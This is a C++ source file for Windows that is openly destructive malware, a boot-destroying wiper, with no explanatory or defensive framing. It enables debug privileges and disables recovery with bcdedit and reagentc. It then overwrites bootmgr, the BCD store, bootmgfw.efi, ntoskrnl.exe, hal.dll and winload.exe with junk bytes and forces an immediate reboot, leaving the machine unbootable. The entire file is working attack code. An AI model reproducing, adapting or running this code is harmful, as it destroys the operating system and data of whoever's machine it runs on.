#include <windows.h>
#include <fstream>
#include <vector>
#include <string>

void EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
}

void InfiniteBootLoop() {
    system("bcdedit /set {default} recoveryenabled No >nul 2>&1");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1");
    system("bcdedit /set {current} recoveryenabled No >nul 2>&1");
    system("bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1");
    
    system("wmic computersystem where name=\"%computername%\" set automaticresetbootoption = 1 >nul 2>&1");
    
    SetFileAttributesW(L"C:\\bootmgr", FILE_ATTRIBUTE_NORMAL);
    std::ofstream bootmgr("C:\\bootmgr", std::ios::binary | std::ios::trunc);
    if (bootmgr.is_open()) {
        char corrupt[512] = {0};
        bootmgr.write(corrupt, sizeof(corrupt));
        bootmgr.close();
    }
    
    SetFileAttributesW(L"C:\\Boot\\BCD", FILE_ATTRIBUTE_NORMAL);
    std::ofstream bcd("C:\\Boot\\BCD", std::ios::binary | std::ios::trunc);
    if (bcd.is_open()) {
        char corrupt[4096] = {0};
        bcd.write(corrupt, sizeof(corrupt));
        bcd.close();
    }
    
    SetFileAttributesW(L"C:\\Windows\\Boot\\EFI\\bootmgfw.efi", FILE_ATTRIBUTE_NORMAL);
    std::ofstream bootefi("C:\\Windows\\Boot\\EFI\\bootmgfw.efi", std::ios::binary | std::ios::trunc);
    if (bootefi.is_open()) {
        char corrupt[1024] = {0};
        bootefi.write(corrupt, sizeof(corrupt));
        bootefi.close();
    }
    
    system("bcdedit /copy {current} /d \"Infinite Boot Loop\" >nul 2>&1");
    system("bcdedit /set {bootmgr} displaybootmenu Yes >nul 2>&1");
    system("bcdedit /set {bootmgr} timeout 0 >nul 2>&1");
    
    system("bcdedit /set {default} bootmenupolicy legacy >nul 2>&1");
    system("bcdedit /set {default} highestmode Yes >nul 2>&1");
    system("bcdedit /set {default} novesa Yes >nul 2>&1");
    system("bcdedit /set {default} nolowmem Yes >nul 2>&1");
    
    SetFileAttributesW(L"C:\\Windows\\System32\\ntoskrnl.exe", FILE_ATTRIBUTE_NORMAL);
    std::ofstream kernel("C:\\Windows\\System32\\ntoskrnl.exe", std::ios::binary | std::ios::trunc);
    if (kernel.is_open()) {
        char corrupt[4096] = {0xDE, 0xAD, 0xBE, 0xEF};
        for (int i = 0; i < 1024; i++) {
            kernel.write(corrupt, sizeof(corrupt));
        }
        kernel.close();
    }
    
    SetFileAttributesW(L"C:\\Windows\\System32\\hal.dll", FILE_ATTRIBUTE_NORMAL);
    std::ofstream hal("C:\\Windows\\System32\\hal.dll", std::ios::binary | std::ios::trunc);
    if (hal.is_open()) {
        char corrupt[512] = {0};
        hal.write(corrupt, sizeof(corrupt));
        hal.close();
    }
    
    SetFileAttributesW(L"C:\\Windows\\System32\\winload.exe", FILE_ATTRIBUTE_NORMAL);
    std::ofstream winload("C:\\Windows\\System32\\winload.exe", std::ios::binary | std::ios::trunc);
    if (winload.is_open()) {
        char corrupt[1024] = {0xFF};
        winload.write(corrupt, sizeof(corrupt));
        winload.close();
    }
    
    system("reagentc /disable >nul 2>&1");
    system("bcdedit /set {default} recoverysequence {bootmgr} >nul 2>&1");
    system("bcdedit /set {default} recoveryenabled No >nul 2>&1");
    
    system("bcdedit /set {current} safeboot minimal >nul 2>&1");
    system("bcdedit /deletevalue {current} safeboot >nul 2>&1");
}

int main() {
    EnableDebugPrivilege();
    InfiniteBootLoop();
    system("shutdown /r /f /t 0 >nul 2>&1");
    return 0;
}